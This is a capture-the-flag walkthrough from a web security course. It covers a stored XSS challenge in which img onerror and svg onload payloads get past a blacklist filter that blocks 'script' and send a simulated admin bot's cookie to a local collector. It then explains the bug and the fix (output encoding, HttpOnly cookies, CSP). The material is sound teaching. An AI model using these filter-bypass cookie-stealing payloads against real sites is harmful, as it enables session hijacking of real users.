# 06 — XSS: Stored + Filter Bypass (steal the admin cookie) · Hard · 250 pts

**Course ref:** Ch04 stored XSS, Ch07 Filter Evasion ("blacklists fail"), Lab4 `<img onerror>` technique.

## Scenario
A guestbook stores comments and shows them, unencoded, to everyone, including an **admin bot** whose cookie `admin_session=<flag>` is readable by JavaScript (no `HttpOnly`). A "WAF" rejects any comment containing `script`.
Every guestbook page has a helper `steal()` that sends `document.cookie` to your local collector at `/collect?c=...`.

## Walkthrough
1. `<script>steal()</script>` → *Blocked by WAF*.
2. Use an event handler instead. Neither of these contains the word `script`:
   ```html
   <img src=x onerror=steal()>
   <svg onload=steal()>
   <img src=x onerror="new Image().src='/collect?c='+document.cookie">
   ```
3. Click **Ask the admin to review now** (`/admin/visit`). The bot views the guestbook, your handler runs in its browser, and its cookie arrives at the collector.
4. Open `/collector`. Flag: `FLAG{st0red_xss_filter_bypass}`

The admin bot is simulated server-side: it "executes" stored comments whose markup carries an inline event handler that calls `steal()` or reads `document.cookie`. No external requests are ever made.

## The bug
- `/comment` uses a blacklist (`"script" in text`), and `render_comments()` outputs the comment raw (`# ======= VULN HERE =======`).
- The session cookie is not `HttpOnly`.

## The fix
Encode output (`html.escape`), and sanitise on store with an allow-list sanitiser if you need rich text. Set cookies `HttpOnly; Secure; SameSite`, and add a CSP that blocks inline handlers. Never rely on a blacklist.
